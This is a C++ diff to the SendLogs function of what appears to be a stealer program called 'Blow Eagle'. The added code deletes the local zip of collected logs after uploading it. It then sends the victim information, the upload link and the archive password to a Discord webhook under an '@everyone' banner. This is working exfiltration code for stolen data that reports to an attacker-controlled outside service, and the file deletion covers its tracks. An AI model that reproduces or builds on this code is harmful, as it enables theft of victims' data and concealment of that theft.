@@ -26,12 +26,33 @@
 #include "../../config/config.cpp"
 #include "../../helper/helper.h"
 
-void manager::SendLogs(std::string zipName,std::string zipPwd)
+void manager::SendLogs(std::string zipName,std::string zipPwd, std::string info)
 {
 	printf("send\n");
 
 	std::string url = func::upload_file(zipName);
 
+	func::deleteFile(zipName);
+
 	std::cout << url << std::endl;
 	std::cout << zipPwd << std::endl;
+
+	std::string logo = R"LOGO(
+❗❗❗Blow Eagle data❗❗❗
+______ _                 _____            _      
+| ___ \ |               |  ___|          | |     
+| |_/ / | _____      __ | |__  __ _  __ _| | ___ 
+| ___ \ |/ _ \ \ /\ / / |  __|/ _` |/ _` | |/ _ \
+| |_/ / | (_) \ V  V /  | |__| (_| | (_| | |  __/
+\____/|_|\___/ \_/\_/   \____/\__,_|\__, |_|\___|
+                                     __/ |       
+                                    |___/        
+❗❗❗hey @everyone see Blow Eagle data❗❗❗
+)LOGO";
+
+	std::string message = logo + '\n'+ info+"\n\n🔗Link: "+url+"\n🔑Password: |"+ zipPwd+"|\nThe-Blow-Eagle | by Nick Vinesmoke";
+
+	func::sendDiscordWebhook(config::Bot_url, message);
+
+	std::cout << message << std::endl;
 }
